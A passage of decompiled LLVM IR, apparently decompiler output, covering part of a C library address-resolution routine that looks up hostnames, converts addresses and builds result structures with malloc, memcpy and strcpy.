dec_label_pc_805d27d:                             ; preds = %dec_label_pc_805d273
  %v3_805d27d = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d27d, i32* @edi, align 4
  store i8* null, i8** %stack_var_-148, align 4
  %v1_805d4fc41 = icmp eq i32 %v3_805d27d, 0
  %v1_805d4fe48 = icmp eq i1 %v1_805d4fc41, false
  br i1 %v1_805d4fe48, label %dec_label_pc_805d28f.lr.ph, label %dec_label_pc_805d534

dec_label_pc_805d28f.lr.ph:                       ; preds = %dec_label_pc_805d27d
  %v1_805d3d1 = inttoptr i32 %arg3 to i32*
  %v2_805d2c2 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805d2d8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805d2e2 = ptrtoint i32* %stack_var_-68 to i32
  %v2_805d31b = ptrtoint i32* %stack_var_-114 to i32
  %tmp164 = bitcast i8** %stack_var_-148 to i32*
  br label %dec_label_pc_805d28f

dec_label_pc_805d28f:                             ; preds = %dec_label_pc_805d28f.lr.ph, %dec_label_pc_805d4fa
  %v0_805d2b399 = phi i32 [ %v3_805d27d, %dec_label_pc_805d28f.lr.ph ], [ %v2_805d4fa, %dec_label_pc_805d4fa ]
  %stack_var_16.150 = phi i32 [ %arg4, %dec_label_pc_805d28f.lr.ph ], [ %stack_var_16.0.lcssa, %dec_label_pc_805d4fa ]
  %stack_var_-132.149 = phi i32 [ %tmp108, %dec_label_pc_805d28f.lr.ph ], [ %stack_var_-132.0, %dec_label_pc_805d4fa ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d29c = load i8, i8* %tmp118, align 1
  %v3_805d29c = and i8 %v2_805d29c, 2
  %v4_805d29c = icmp eq i8 %v3_805d29c, 0
  br i1 %v4_805d29c, label %dec_label_pc_805d364, label %dec_label_pc_805d2a5

dec_label_pc_805d2a5:                             ; preds = %dec_label_pc_805d28f
  store i32 0, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805d2b1

dec_label_pc_805d2b1:                             ; preds = %dec_label_pc_805d300.dec_label_pc_805d2b1_crit_edge, %dec_label_pc_805d2a5
  %v0_805d2b3 = phi i32 [ %v0_805d2b3.pre, %dec_label_pc_805d300.dec_label_pc_805d2b1_crit_edge ], [ %v0_805d2b399, %dec_label_pc_805d2a5 ]
  %v0_805d2b1 = phi i32 [ %v0_805d2b1.pre, %dec_label_pc_805d300.dec_label_pc_805d2b1_crit_edge ], [ 512, %dec_label_pc_805d2a5 ]
  %v2_805d2b1 = mul i32 %v0_805d2b1, 2
  store i32 %v2_805d2b1, i32* @esi, align 4
  %v1_805d2b3 = add i32 %v0_805d2b3, 4
  %v2_805d2b3 = inttoptr i32 %v1_805d2b3 to i32*
  %v3_805d2b3 = load i32, i32* %v2_805d2b3, align 4
  store i32 %v3_805d2b3, i32* @ebx, align 4
  %v1_805d2b6 = add i32 %v0_805d2b3, 8
  %v1_805d2b9 = add i32 %v2_805d2b1, 30
  %v1_805d2bf = and i32 %v1_805d2b9, -16
  %v0_805d2c5 = load i32, i32* @esp, align 4
  %v2_805d2c5 = sub i32 %v0_805d2c5, %v1_805d2bf
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805d2c9 = add i32 %v2_805d2c5, 15
  store i32 %v1_805d2c9, i32* %ecx.global-to-local, align 4
  %v2_805d2cd = add i32 %v2_805d2c5, -4
  %v3_805d2cd = inttoptr i32 %v2_805d2cd to i32*
  store i32 %v2_805d2c2, i32* %v3_805d2cd, align 4
  %v0_805d2ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d2ce = and i32 %v0_805d2ce, -16
  store i32 %v1_805d2ce, i32* %ecx.global-to-local, align 4
  %v0_805d2d1 = load i32, i32* @ebx, align 4
  %v9_805d2d1 = icmp eq i32 %v0_805d2d1, 10
  %v1_805d2d4 = zext i1 %v9_805d2d1 to i32
  %v2_805d2d4 = load i32, i32* %eax.global-to-local, align 4
  %v3_805d2d4 = and i32 %v2_805d2d4, -256
  %v4_805d2d4 = or i32 %v3_805d2d4, %v1_805d2d4
  %v1_805d2d7 = add i32 %v4_805d2d4, -1
  %v1_805d2db = and i32 %v1_805d2d7, -12
  store i32 %v1_805d2db, i32* %eax.global-to-local, align 4
  %v2_805d2de = add i32 %v2_805d2c5, -8
  %v3_805d2de = inttoptr i32 %v2_805d2de to i32*
  store i32 %v2_805d2d8, i32* %v3_805d2de, align 4
  %v0_805d2df = load i32, i32* %eax.global-to-local, align 4
  %v1_805d2df = add i32 %v0_805d2df, 16
  store i32 %v1_805d2df, i32* %eax.global-to-local, align 4
  store i32 %v2_805d2e2, i32* %edx.global-to-local, align 4
  %v0_805d2e5 = load i32, i32* @esi, align 4
  %v2_805d2e5 = add i32 %v2_805d2c5, -12
  %v3_805d2e5 = inttoptr i32 %v2_805d2e5 to i32*
  store i32 %v0_805d2e5, i32* %v3_805d2e5, align 4
  %v0_805d2e6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_805d2e6 = add i32 %v2_805d2c5, -16
  %v3_805d2e6 = inttoptr i32 %v2_805d2e6 to i32*
  store i32 %v0_805d2e6, i32* %v3_805d2e6, align 4
  %v2_805d2e7 = add i32 %v2_805d2c5, -20
  %v3_805d2e7 = inttoptr i32 %v2_805d2e7 to i32*
  store i32 %v2_805d2e2, i32* %v3_805d2e7, align 4
  %v0_805d2e8 = load i32, i32* @ebx, align 4
  %v2_805d2e8 = add i32 %v2_805d2c5, -24
  %v3_805d2e8 = inttoptr i32 %v2_805d2e8 to i32*
  store i32 %v0_805d2e8, i32* %v3_805d2e8, align 4
  %v0_805d2e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d2e9 = add i32 %v2_805d2c5, -28
  %v3_805d2e9 = inttoptr i32 %v2_805d2e9 to i32*
  store i32 %v0_805d2e9, i32* %v3_805d2e9, align 4
  %v5_805d2ea = add i32 %v2_805d2c5, -32
  %v6_805d2ea = inttoptr i32 %v5_805d2ea to i32*
  store i32 %v1_805d2b6, i32* %v6_805d2ea, align 4
  %v1_805d2ed = inttoptr i32 %v1_805d2b6 to i8*
  %v2_805d2ed = call i32 @__GI_gethostbyaddr_r(i8* %v1_805d2ed)
  store i32 %v2_805d2ed, i32* %eax.global-to-local, align 4
  store i32 %v2_805d2ed, i32* @ebx, align 4
  %v1_805d2f7 = call i32 @__errno_location(i32 %v1_805d2b6)
  store i32 %v1_805d2f7, i32* %eax.global-to-local, align 4
  %v2_805d2fc = inttoptr i32 %v1_805d2f7 to i32*
  %v3_805d2fc = load i32, i32* %v2_805d2fc, align 4
  %v14_805d2fc = icmp eq i32 %v2_805d2ed, %v3_805d2fc
  %v1_805d2fe = icmp eq i1 %v14_805d2fc, false
  br i1 %v1_805d2fe, label %dec_label_pc_805d306, label %dec_label_pc_805d300

dec_label_pc_805d300:                             ; preds = %dec_label_pc_805d2b1
  %v3_805d300 = load i8*, i8** %stack_var_-32, align 4
  %v14_805d300 = icmp eq i8* %v3_805d300, inttoptr (i32 -1 to i8*)
  br i1 %v14_805d300, label %dec_label_pc_805d300.dec_label_pc_805d2b1_crit_edge, label %dec_label_pc_805d306

dec_label_pc_805d300.dec_label_pc_805d2b1_crit_edge: ; preds = %dec_label_pc_805d300
  %v0_805d2b1.pre = load i32, i32* @esi, align 4
  %v0_805d2b3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d2b1

dec_label_pc_805d306:                             ; preds = %dec_label_pc_805d300, %dec_label_pc_805d2b1
  %v1_805d306 = icmp eq i32 %v2_805d2ed, 0
  br i1 %v1_805d306, label %dec_label_pc_805d314, label %dec_label_pc_805d30a

dec_label_pc_805d30a:                             ; preds = %dec_label_pc_805d306
  %v3_805d30a = load i8*, i8** %stack_var_-32, align 4
  %v14_805d30a = icmp eq i8* %v3_805d30a, inttoptr (i32 -1 to i8*)
  br i1 %v14_805d30a, label %dec_label_pc_805d51b, label %dec_label_pc_805d314

dec_label_pc_805d314:                             ; preds = %dec_label_pc_805d30a, %dec_label_pc_805d306
  %v3_805d314 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_805d314, i32* %eax.global-to-local, align 4
  %v1_805d317 = icmp eq i32 %v3_805d314, 0
  %v1_805d319 = icmp eq i1 %v1_805d317, false
  br i1 %v1_805d319, label %dec_label_pc_805d337, label %dec_label_pc_805d31b

dec_label_pc_805d31b:                             ; preds = %dec_label_pc_805d314
  store i32 %v2_805d31b, i32* %eax.global-to-local, align 4
  %v0_805d31e = load i32, i32* @esp, align 4
  %v1_805d31e = add i32 %v0_805d31e, -4
  %v2_805d31e = inttoptr i32 %v1_805d31e to i32*
  store i32 46, i32* %v2_805d31e, align 4
  %v2_805d320 = add i32 %v0_805d31e, -8
  %v3_805d320 = inttoptr i32 %v2_805d320 to i32*
  store i32 %v2_805d31b, i32* %v3_805d320, align 4
  %v5_805d321 = add i32 %v0_805d31e, -12
  %v6_805d321 = inttoptr i32 %v5_805d321 to i32*
  store i32 %v1_805d2b6, i32* %v6_805d321, align 4
  %v0_805d324 = load i32, i32* @edi, align 4
  %v1_805d324 = add i32 %v0_805d324, 4
  %v2_805d324 = inttoptr i32 %v1_805d324 to i32*
  %v3_805d324 = load i32, i32* %v2_805d324, align 4
  %v5_805d324 = add i32 %v0_805d31e, -16
  %v6_805d324 = inttoptr i32 %v5_805d324 to i32*
  store i32 %v3_805d324, i32* %v6_805d324, align 4
  %v5_805d327 = call i32 @__GI_inet_ntop(i32 %v1_805d2b6, i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805d327, i32* %eax.global-to-local, align 4
  store i32 %v5_805d327, i32* %tmp164, align 4
  %tmp165 = inttoptr i32 %v5_805d327 to i8*
  br label %dec_label_pc_805d33f

dec_label_pc_805d337:                             ; preds = %dec_label_pc_805d314
  %v1_805d337 = inttoptr i32 %v3_805d314 to i32*
  %v2_805d337 = load i32, i32* %v1_805d337, align 4
  store i32 %v2_805d337, i32* %eax.global-to-local, align 4
  %v5_805d339 = inttoptr i32 %v2_805d337 to i8*
  store i8* %v5_805d339, i8** %stack_var_-148, align 4
  br label %dec_label_pc_805d33f

dec_label_pc_805d33f:                             ; preds = %dec_label_pc_805d31b, %dec_label_pc_805d337
  %v3_805d34f = phi i8* [ %tmp165, %dec_label_pc_805d31b ], [ %v5_805d339, %dec_label_pc_805d337 ]
  %v5_805d33f = icmp eq i8* %v3_805d34f, null
  br i1 %v5_805d33f, label %dec_label_pc_805d514, label %dec_label_pc_805d34c

dec_label_pc_805d34c:                             ; preds = %dec_label_pc_805d33f
  %v4_805d33f = ptrtoint i8* %v3_805d34f to i32
  %v0_805d34c = load i32, i32* @esp, align 4
  %v6_805d34f = add i32 %v0_805d34c, -16
  %v7_805d34f = inttoptr i32 %v6_805d34f to i32*
  store i32 %v4_805d33f, i32* %v7_805d34f, align 4
  %v0_805d355 = load i8*, i8** %stack_var_-148, align 4
  %v3_805d355 = call i32 @strlen(i8* %v0_805d355)
  %v1_805d35d = add i32 %v3_805d355, 1
  store i32 %v1_805d35d, i32* %eax.global-to-local, align 4
  %v0_805d364.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d364

dec_label_pc_805d364:                             ; preds = %dec_label_pc_805d28f, %dec_label_pc_805d34c
  %v0_805d364 = phi i32 [ %v0_805d2b399, %dec_label_pc_805d28f ], [ %v0_805d364.pre, %dec_label_pc_805d34c ]
  %stack_var_-132.0 = phi i32 [ %stack_var_-132.149, %dec_label_pc_805d28f ], [ %v1_805d2b6, %dec_label_pc_805d34c ]
  %stack_var_-140.0 = phi i32 [ 0, %dec_label_pc_805d28f ], [ %v1_805d35d, %dec_label_pc_805d34c ]
  %v1_805d364 = add i32 %v0_805d364, 4
  %v2_805d364 = inttoptr i32 %v1_805d364 to i32*
  %v3_805d364 = load i32, i32* %v2_805d364, align 4
  %v12_805d364 = icmp eq i32 %v3_805d364, 10
  br i1 %v12_805d364, label %dec_label_pc_805d39b, label %dec_label_pc_805d36a

dec_label_pc_805d36a:                             ; preds = %dec_label_pc_805d364
  %v3_805d36a = load i32, i32* %stack_var_-156, align 4
  %v4_805d36a = icmp eq i32 %v3_805d36a, 0
  %. = select i1 %v4_805d36a, i32 16, i32 28
  %.16 = select i1 %v4_805d36a, i16 2, i16 10
  br label %dec_label_pc_805d39b

dec_label_pc_805d39b:                             ; preds = %dec_label_pc_805d36a, %dec_label_pc_805d364
  %storemerge15 = phi i32 [ 28, %dec_label_pc_805d364 ], [ %., %dec_label_pc_805d36a ]
  %storemerge11 = phi i16 [ 10, %dec_label_pc_805d364 ], [ %.16, %dec_label_pc_805d36a ]
  %storemerge930 = load i32, i32* %stack_var_-20, align 4
  store i32 %storemerge930, i32* @esi, align 4
  %v1_805d4f231 = icmp eq i32 %storemerge930, 0
  %v1_805d4f438 = icmp eq i1 %v1_805d4f231, false
  br i1 %v1_805d4f438, label %dec_label_pc_805d3a3.lr.ph, label %dec_label_pc_805d4fa

dec_label_pc_805d3a3.lr.ph:                       ; preds = %dec_label_pc_805d39b
  %v1_805d3b717 = zext i16 %storemerge11 to i32
  %v10_805d412 = icmp eq i16 %storemerge11, 10
  %v4_805d481 = inttoptr i32 %v1_805d3b717 to i16*
  %v4_805d498 = inttoptr i32 %v1_805d3b717 to i8*
  %v2_805d4b4 = or i32 %storemerge15, 32
  %v3_805d3b2 = add i32 %v2_805d4b4, %stack_var_-140.0
  %v1_805d421 = icmp eq i1 %v10_805d412, false
  br label %dec_label_pc_805d3a3

dec_label_pc_805d3a3:                             ; preds = %dec_label_pc_805d3a3.lr.ph, %dec_label_pc_805d4dc
  %stack_var_16.039 = phi i32 [ %stack_var_16.150, %dec_label_pc_805d3a3.lr.ph ], [ %v1_805d4ea, %dec_label_pc_805d4dc ]
  store i32 %stack_var_-140.0, i32* @ecx, align 4
  store i32 %storemerge15, i32* %edx.global-to-local, align 4
  %v0_805d3af = load i32, i32* @esp, align 4
  store i32 %v3_805d3b2, i32* %eax.global-to-local, align 4
  %v2_805d3b6 = add i32 %v0_805d3af, -16
  %v3_805d3b6 = inttoptr i32 %v2_805d3b6 to i32*
  store i32 %v3_805d3b2, i32* %v3_805d3b6, align 4
  %v2_805d3b7 = call i32 @malloc(i32 %v1_805d3b717)
  store i32 %v2_805d3b7, i32* %eax.global-to-local, align 4
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  store i32 %v2_805d3b7, i32* %edx.global-to-local, align 4
  %v1_805d3c4 = icmp eq i32 %v2_805d3b7, 0
  %v2_805d3c6 = inttoptr i32 %stack_var_16.039 to i32*
  store i32 %v2_805d3b7, i32* %v2_805d3c6, align 4
  br i1 %v1_805d3c4, label %dec_label_pc_805d52d, label %dec_label_pc_805d3ce

dec_label_pc_805d3ce:                             ; preds = %dec_label_pc_805d3a3
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805d3d1 = load i32, i32* %v1_805d3d1, align 4
  %v1_805d3d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d3d3 = inttoptr i32 %v1_805d3d3 to i32*
  store i32 %v2_805d3d1, i32* %v2_805d3d3, align 4
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805d3d8 = load i32, i32* %v2_805d3c6, align 4
  store i32 %v2_805d3d8, i32* %edx.global-to-local, align 4
  store i32 %v1_805d3b717, i32* %eax.global-to-local, align 4
  %v2_805d3e1 = add i32 %v2_805d3d8, 4
  %v3_805d3e1 = inttoptr i32 %v2_805d3e1 to i32*
  store i32 %v1_805d3b717, i32* %v3_805d3e1, align 4
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v0_805d3e7 = load i32, i32* @esi, align 4
  %v1_805d3e7 = add i32 %v0_805d3e7, 4
  %v2_805d3e7 = inttoptr i32 %v1_805d3e7 to i32*
  %v3_805d3e7 = load i32, i32* %v2_805d3e7, align 4
  store i32 %v3_805d3e7, i32* %eax.global-to-local, align 4
  %v2_805d3ea = load i32, i32* %v2_805d3c6, align 4
  store i32 %v2_805d3ea, i32* %edx.global-to-local, align 4
  %v2_805d3ec = add i32 %v2_805d3ea, 8
  %v3_805d3ec = inttoptr i32 %v2_805d3ec to i32*
  store i32 %v3_805d3e7, i32* %v3_805d3ec, align 4
  %v0_805d3ef = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d3ef = inttoptr i32 %v0_805d3ef to i32*
  %v2_805d3ef = load i32, i32* %v1_805d3ef, align 4
  store i32 %v2_805d3ef, i32* %edx.global-to-local, align 4
  %v0_805d3f1 = load i32, i32* @esi, align 4
  %v1_805d3f1 = add i32 %v0_805d3f1, 8
  %v2_805d3f1 = inttoptr i32 %v1_805d3f1 to i32*
  %v3_805d3f1 = load i32, i32* %v2_805d3f1, align 4
  store i32 %v3_805d3f1, i32* %eax.global-to-local, align 4
  %v2_805d3f4 = add i32 %v2_805d3ef, 12
  %v3_805d3f4 = inttoptr i32 %v2_805d3f4 to i32*
  store i32 %v3_805d3f1, i32* %v3_805d3f4, align 4
  %v0_805d3f7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d3f7 = inttoptr i32 %v0_805d3f7 to i32*
  %v2_805d3f7 = load i32, i32* %v1_805d3f7, align 4
  store i32 %v2_805d3f7, i32* %eax.global-to-local, align 4
  store i32 %storemerge15, i32* %edx.global-to-local, align 4
  %v2_805d3ff = add i32 %v2_805d3f7, 16
  %v3_805d3ff = inttoptr i32 %v2_805d3ff to i32*
  store i32 %storemerge15, i32* %v3_805d3ff, align 4
  %v0_805d402 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d402 = inttoptr i32 %v0_805d402 to i32*
  %v2_805d402 = load i32, i32* %v1_805d402, align 4
  store i32 %v2_805d402, i32* %edx.global-to-local, align 4
  %v1_805d404 = add i32 %v2_805d402, 32
  store i32 %v1_805d404, i32* %eax.global-to-local, align 4
  %v2_805d407 = add i32 %v2_805d402, 20
  %v3_805d407 = inttoptr i32 %v2_805d407 to i32*
  store i32 %v1_805d404, i32* %v3_805d407, align 4
  %v0_805d40a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d40a = inttoptr i32 %v0_805d40a to i32*
  %v2_805d40a = load i32, i32* %v1_805d40a, align 4
  store i32 %v2_805d40a, i32* %eax.global-to-local, align 4
  store i32 %v1_805d3b717, i32* %ecx.global-to-local, align 4
  %v1_805d416 = add i32 %v2_805d40a, 20
  %v2_805d416 = inttoptr i32 %v1_805d416 to i32*
  %v3_805d416 = load i32, i32* %v2_805d416, align 4
  %v3_805d419 = inttoptr i32 %v3_805d416 to i16*
  store i16 %storemerge11, i16* %v3_805d419, align 2
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805d41f = load i32, i32* %v2_805d3c6, align 4
  store i32 %v2_805d41f, i32* %edx.global-to-local, align 4
  %v1_805d473 = add i32 %v2_805d41f, 20
  %v2_805d473 = inttoptr i32 %v1_805d473 to i32*
  %v3_805d473 = load i32, i32* %v2_805d473, align 4
  store i32 %v3_805d473, i32* @ebx, align 4
  %v0_805d476 = load i32, i32* @edi, align 4
  %v1_805d476 = add i32 %v0_805d476, 8
  store i32 %v1_805d476, i32* %eax.global-to-local, align 4
  br i1 %v1_805d421, label %dec_label_pc_805d473, label %dec_label_pc_805d423

dec_label_pc_805d423:                             ; preds = %dec_label_pc_805d3ce
  %v1_805d429 = add i32 %v3_805d473, 4
  %v2_805d429 = inttoptr i32 %v1_805d429 to i32*
  store i32 0, i32* %v2_805d429, align 4
  %v0_805d430 = load i32, i32* @edi, align 4
  %v1_805d430 = add i32 %v0_805d430, 4
  %v2_805d430 = inttoptr i32 %v1_805d430 to i32*
  %v3_805d430 = load i32, i32* %v2_805d430, align 4
  %v12_805d430 = icmp eq i32 %v3_805d430, 10
  %v1_805d434 = icmp eq i1 %v12_805d430, false
  br i1 %v1_805d434, label %dec_label_pc_805d43f, label %dec_label_pc_805d436

dec_label_pc_805d436:                             ; preds = %dec_label_pc_805d423
  %v0_805d436 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d436 = load i32, i32* @esp, align 4
  %v2_805d436 = add i32 %v1_805d436, -4
  %v3_805d436 = inttoptr i32 %v2_805d436 to i32*
  store i32 %v0_805d436, i32* %v3_805d436, align 4
  %v1_805d437 = add i32 %v1_805d436, -8
  %v2_805d437 = inttoptr i32 %v1_805d437 to i32*
  store i32 16, i32* %v2_805d437, align 4
  %v0_805d439 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d439 = add i32 %v1_805d436, -12
  %v3_805d439 = inttoptr i32 %v2_805d439 to i32*
  store i32 %v0_805d439, i32* %v3_805d439, align 4
  %v0_805d43a = load i32, i32* @ebx, align 4
  %v1_805d43a = add i32 %v0_805d43a, 8
  br label %dec_label_pc_805d45b

dec_label_pc_805d43f:                             ; preds = %dec_label_pc_805d423
  %v0_805d43f = load i32, i32* @ebx, align 4
  %v1_805d43f = add i32 %v0_805d43f, 8
  %v2_805d43f = inttoptr i32 %v1_805d43f to i32*
  store i32 0, i32* %v2_805d43f, align 4
  %v0_805d446 = load i32, i32* @ebx, align 4
  %v1_805d446 = add i32 %v0_805d446, 12
  %v2_805d446 = inttoptr i32 %v1_805d446 to i32*
  store i32 0, i32* %v2_805d446, align 4
  %v0_805d44d = load i32, i32* @ebx, align 4
  %v1_805d44d = add i32 %v0_805d44d, 16
  %v2_805d44d = inttoptr i32 %v1_805d44d to i32*
  store i32 -65536, i32* %v2_805d44d, align 4
  %v0_805d454 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d454 = load i32, i32* @esp, align 4
  %v2_805d454 = add i32 %v1_805d454, -4
  %v3_805d454 = inttoptr i32 %v2_805d454 to i32*
  store i32 %v0_805d454, i32* %v3_805d454, align 4
  %v1_805d455 = add i32 %v1_805d454, -8
  %v2_805d455 = inttoptr i32 %v1_805d455 to i32*
  store i32 4, i32* %v2_805d455, align 4
  %v0_805d457 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d457 = add i32 %v1_805d454, -12
  %v3_805d457 = inttoptr i32 %v2_805d457 to i32*
  store i32 %v0_805d457, i32* %v3_805d457, align 4
  %v0_805d458 = load i32, i32* @ebx, align 4
  %v1_805d458 = add i32 %v0_805d458, 20
  br label %dec_label_pc_805d45b

dec_label_pc_805d45b:                             ; preds = %dec_label_pc_805d436, %dec_label_pc_805d43f
  %v1_805d45b = phi i32 [ %v2_805d439, %dec_label_pc_805d436 ], [ %v2_805d457, %dec_label_pc_805d43f ]
  %storemerge10 = phi i32 [ %v1_805d43a, %dec_label_pc_805d436 ], [ %v1_805d458, %dec_label_pc_805d43f ]
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_805d45b = add i32 %v1_805d45b, -4
  %v3_805d45b = inttoptr i32 %v2_805d45b to i32*
  store i32 %storemerge10, i32* %v3_805d45b, align 4
  %v5_805d45c = call i32 @memcpy(i16* %v4_805d481, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805d45c, i32* %eax.global-to-local, align 4
  %v0_805d461 = load i32, i32* @esi, align 4
  %v1_805d461 = add i32 %v0_805d461, 12
  %v2_805d461 = inttoptr i32 %v1_805d461 to i32*
  %v3_805d461 = load i32, i32* %v2_805d461, align 4
  store i32 %v3_805d461, i32* %eax.global-to-local, align 4
  %v1_805d467 = trunc i32 %v3_805d461 to i16
  %v2_805d467 = load i32, i32* @ebx, align 4
  %v3_805d467 = add i32 %v2_805d467, 2
  %v4_805d467 = inttoptr i32 %v3_805d467 to i16*
  store i16 %v1_805d467, i16* %v4_805d467, align 2
  %v0_805d46b = load i32, i32* @edi, align 4
  %v1_805d46b = add i32 %v0_805d46b, 24
  %v2_805d46b = inttoptr i32 %v1_805d46b to i32*
  %v3_805d46b = load i32, i32* %v2_805d46b, align 4
  store i32 %v3_805d46b, i32* %eax.global-to-local, align 4
  %v1_805d46e = load i32, i32* @ebx, align 4
  %v2_805d46e = add i32 %v1_805d46e, 24
  %v3_805d46e = inttoptr i32 %v2_805d46e to i32*
  store i32 %v3_805d46b, i32* %v3_805d46e, align 4
  br label %dec_label_pc_805d4a0

dec_label_pc_805d473:                             ; preds = %dec_label_pc_805d3ce
  %v0_805d479 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d479 = load i32, i32* @esp, align 4
  %v2_805d479 = add i32 %v1_805d479, -4
  %v3_805d479 = inttoptr i32 %v2_805d479 to i32*
  store i32 %v0_805d479, i32* %v3_805d479, align 4
  %v1_805d47a = add i32 %v1_805d479, -8
  %v2_805d47a = inttoptr i32 %v1_805d47a to i32*
  store i32 4, i32* %v2_805d47a, align 4
  %v0_805d47c = load i32, i32* %eax.global-to-local, align 4
  %v2_805d47c = add i32 %v1_805d479, -12
  %v3_805d47c = inttoptr i32 %v2_805d47c to i32*
  store i32 %v0_805d47c, i32* %v3_805d47c, align 4
  %v0_805d47d = load i32, i32* @ebx, align 4
  %v1_805d47d = add i32 %v0_805d47d, 4
  store i32 %v1_805d47d, i32* %eax.global-to-local, align 4
  %v2_805d480 = add i32 %v1_805d479, -16
  %v3_805d480 = inttoptr i32 %v2_805d480 to i32*
  store i32 %v1_805d47d, i32* %v3_805d480, align 4
  %v5_805d481 = call i32 @memcpy(i16* %v4_805d481, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805d481, i32* %eax.global-to-local, align 4
  %v0_805d486 = load i32, i32* @esi, align 4
  %v1_805d486 = add i32 %v0_805d486, 12
  %v2_805d486 = inttoptr i32 %v1_805d486 to i32*
  %v3_805d486 = load i32, i32* %v2_805d486, align 4
  store i32 %v3_805d486, i32* %eax.global-to-local, align 4
  %v1_805d48c = trunc i32 %v3_805d486 to i16
  %v2_805d48c = load i32, i32* @ebx, align 4
  %v3_805d48c = add i32 %v2_805d48c, 2
  %v4_805d48c = inttoptr i32 %v3_805d48c to i16*
  store i16 %v1_805d48c, i16* %v4_805d48c, align 2
  %v0_805d490 = load i32, i32* @ebx, align 4
  %v1_805d490 = add i32 %v0_805d490, 8
  store i32 %v1_805d490, i32* @ebx, align 4
  %v0_805d493 = load i32, i32* @esp, align 4
  %v1_805d493 = add i32 %v0_805d493, -4
  %v2_805d493 = inttoptr i32 %v1_805d493 to i32*
  store i32 8, i32* %v2_805d493, align 4
  %v1_805d495 = add i32 %v0_805d493, -8
  %v2_805d495 = inttoptr i32 %v1_805d495 to i32*
  store i32 0, i32* %v2_805d495, align 4
  %v0_805d497 = load i32, i32* @ebx, align 4
  %v2_805d497 = add i32 %v0_805d493, -12
  %v3_805d497 = inttoptr i32 %v2_805d497 to i32*
  store i32 %v0_805d497, i32* %v3_805d497, align 4
  %v5_805d498 = call i32 @__GI_memset(i8* %v4_805d498, i32 %stack_var_-132.0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805d498, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d4a0

dec_label_pc_805d4a0:                             ; preds = %dec_label_pc_805d45b, %dec_label_pc_805d473
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v3_805d4a3 = load i8*, i8** %stack_var_-148, align 4
  %v5_805d4a3 = icmp eq i8* %v3_805d4a3, null
  %v2_805d4aa = load i32, i32* %v2_805d3c6, align 4
  store i32 %v2_805d4aa, i32* %edx.global-to-local, align 4
  br i1 %v5_805d4a3, label %dec_label_pc_805d4d5, label %dec_label_pc_805d4ae

dec_label_pc_805d4ae:                             ; preds = %dec_label_pc_805d4a0
  store i32 %storemerge15, i32* %ecx.global-to-local, align 4
  %v3_805d4b4 = add i32 %v2_805d4aa, %v2_805d4b4
  store i32 %v3_805d4b4, i32* %eax.global-to-local, align 4
  %v2_805d4b8 = add i32 %v2_805d4aa, 24
  %v3_805d4b8 = inttoptr i32 %v2_805d4b8 to i32*
  store i32 %v3_805d4b4, i32* %v3_805d4b8, align 4
  %v0_805d4bb = load i32, i32* %edx.global-to-local, align 4
  %v1_805d4bb = load i32, i32* @esp, align 4
  %v2_805d4bb = add i32 %v1_805d4bb, -4
  %v3_805d4bb = inttoptr i32 %v2_805d4bb to i32*
  store i32 %v0_805d4bb, i32* %v3_805d4bb, align 4
  %v0_805d4bc = load i32, i32* %edx.global-to-local, align 4
  %v2_805d4bc = add i32 %v1_805d4bb, -8
  %v3_805d4bc = inttoptr i32 %v2_805d4bc to i32*
  store i32 %v0_805d4bc, i32* %v3_805d4bc, align 4
  store i32 %stack_var_16.039, i32* %edx.global-to-local, align 4
  %v3_805d4c0 = load i8*, i8** %stack_var_-148, align 4
  %v4_805d4c0 = ptrtoint i8* %v3_805d4c0 to i32
  %v6_805d4c0 = add i32 %v1_805d4bb, -12
  %v7_805d4c0 = inttoptr i32 %v6_805d4c0 to i32*
  store i32 %v4_805d4c0, i32* %v7_805d4c0, align 4
  %v0_805d4c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d4c6 = inttoptr i32 %v0_805d4c6 to i32*
  %v2_805d4c6 = load i32, i32* %v1_805d4c6, align 4
  store i32 %v2_805d4c6, i32* @eax, align 4
  %v1_805d4c8 = add i32 %v2_805d4c6, 24
  %v2_805d4c8 = inttoptr i32 %v1_805d4c8 to i32*
  %v3_805d4c8 = load i32, i32* %v2_805d4c8, align 4
  %v5_805d4c8 = add i32 %v1_805d4bb, -16
  %v6_805d4c8 = inttoptr i32 %v5_805d4c8 to i32*
  store i32 %v3_805d4c8, i32* %v6_805d4c8, align 4
  %v4_805d4cb = call i32 @strcpy(i8* %v4_805d498, i32 %stack_var_-132.0)
  store i32 %v4_805d4cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d4dc

